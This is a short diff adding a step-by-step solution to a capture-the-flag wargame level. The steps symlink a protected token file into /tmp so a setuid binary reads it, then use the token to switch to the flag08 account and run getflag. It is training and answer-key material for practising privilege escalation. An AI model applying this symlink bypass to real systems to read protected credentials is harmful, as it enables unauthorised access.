@@ -1,1 +1,6 @@
-
+Step 1: run "cd /tmp"
+Step 2: run "ln -s /home/user/level08/token test"
+Step 3: run "cd"
+Step 4: run "./level08 /tmp/test"
+Step 5: copy the string, run "su flag08" and paste it
+Step 6: run "getflag"
